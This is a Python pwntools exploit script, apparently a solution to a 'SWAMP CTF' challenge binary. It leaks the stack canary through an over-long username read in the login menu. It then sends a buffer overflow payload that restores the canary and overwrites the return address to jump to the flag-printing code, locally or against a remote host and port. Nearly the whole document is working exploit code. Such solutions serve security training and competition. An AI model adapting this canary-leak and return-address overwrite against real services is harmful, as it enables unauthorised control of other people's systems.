from pwn import *
import argparse
import sys

# Constants
BUFFER_OFFSET = 24
CANARY_SIZE = 8
RBP_SIZE = 8
FLAG_PRINT_ADDR = 0x401453  # Code that prints the flag in main()

def get_canary(io):
    """
    Leak the stack canary via the login option.
    """
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"How long is your username: ", b"60")
    io.sendafter(b"Username: ", b"A" * 16)
    io.recvuntil(b"A" * 16)
    leak = io.recv(60)
    canary = b'\x00' + leak[9:16]
    print(f"[+] Leaked canary: {canary.hex()}")
    return canary

def build_payload(canary):
    """
    Build the exploit payload.
    """
    payload  = b"A" * BUFFER_OFFSET
    payload += canary
    payload += b"B" * RBP_SIZE
    payload += p64(FLAG_PRINT_ADDR)
    return payload

def run_local(path):
    """
    Launch local binary process.
    """
    print(f"[*] Running locally: {path}")
    elf = ELF(path)
    context.binary = elf
    io = process(path)
    return io

def run_remote(host, port):
    """
    Connect to remote service.
    """
    print(f"[*] Connecting to {host}:{port}")
    return remote(host, port)

def main():
    parser = argparse.ArgumentParser(description="SWAMP CTF exploit runner")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    # --local ./binary
    local_parser = subparsers.add_parser("local", help="Run exploit locally")
    local_parser.add_argument("binary", type=str, help="Path to local binary")

    # --remote
    remote_parser = subparsers.add_parser("remote", help="Run exploit remotely")
    remote_parser.add_argument("ip", type=str, help="Remote IP or hostname")
    remote_parser.add_argument("port", type=int, help="Remote port")

    args = parser.parse_args()

    # Setup target
    if args.mode == "local":
        io = run_local(args.binary)
    elif args.mode == "remote":
        io = run_remote(args.ip, args.port)
    else:
        print("[-] Unknown mode")
        sys.exit(1)

    # Exploit steps
    canary = get_canary(io)
    io.sendlineafter(b"> ", b"1")
    payload = build_payload(canary)
    io.sendafter(b"Username: ", payload)
    io.sendafter(b"Password: ", b"pwnd\n")

    # Grab the flag
    io.recvline()
    flag = io.recvline().strip()

    if b"swamp" in flag.lower():
        print("[+] FLAG:", flag.decode(errors="ignore"))
    else:
        print("[-] No flag found.")
        print(flag.decode(errors="ignore"))

    io.close()

if __name__ == "__main__":
    main()

